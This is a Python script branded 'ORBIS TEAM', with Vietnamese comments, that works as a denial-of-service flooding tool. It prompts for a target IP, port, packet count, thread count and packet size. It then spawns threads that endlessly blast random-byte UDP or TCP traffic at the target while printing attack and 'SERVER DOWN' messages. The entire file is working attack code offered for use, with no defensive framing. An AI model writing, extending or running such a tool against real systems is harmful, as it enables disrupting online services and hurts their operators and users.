import random
import socket
import threading

print("\033[92m")
print("""
    Tools by:

░█████╗░██████╗░██████╗░██╗░██████╗
██╔══██╗██╔══██╗██╔══██╗██║██╔════╝
██║░░██║██████╔╝██████╦╝██║╚█████╗░
██║░░██║██╔══██╗██╔══██╗██║░╚═══██╗
╚█████╔╝██║░░██║██████╦╝██║██████╔╝
░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝╚═════╝░

""")
print("\033[97m")

# --- Nhận thông tin từ người dùng ---
ip = str(input(" ip :"))
port = int(input(" port :"))
choice = str(input(" Ddos Attack?? (y/n):"))
times = int(input(" Paket :"))
threads = int(input(" threads :"))
size = int(input(" Kich thuoc goi tin (bytes) :")) # <--- THAY ĐỔI: Thêm input cho kích thước gói tin

# Giới hạn kích thước gói tin để tránh lỗi
if size > 65500:
    size = 65500
    print("[!] Kich thuoc goi tin qua lon, da tu dong giam xuong 65500 bytes.")
# ------------------------------------

def run(packet_size): # <--- THAY ĐỔI: Nhận kích thước gói tin làm tham số
    data = random._urandom(packet_size) # <--- THAY ĐỔI: Sử dụng kích thước do người dùng nhập
    i = random.choice(("[-]","[•]","[×]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" ORBIS TEAM DDOS ATTACK!!!")
        except:
            print("[!] SERVER DOWN!!!")

def run2(packet_size): # <--- THAY ĐỔI: Nhận kích thước gói tin làm tham số
    data = random._urandom(packet_size) # <--- THAY ĐỔI: Sử dụng kích thước do người dùng nhập
    i = random.choice(("[-]","[•]","[×]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" ORBIS TEAM DDOS ATTACK!!!")
        except:
            s.close()
            print("[*] SERVER DOWN")
            
for y in range(threads):
    if choice == 'y':
        # <--- THAY ĐỔI: Truyền `size` vào hàm `run` thông qua `args`
        th = threading.Thread(target = run, args=(size,))
        th.start()
    else:
        # <--- THAY ĐỔI: Truyền `size` vào hàm `run2` thông qua `args`
        th = threading.Thread(target = run2, args=(size,))
        th.start()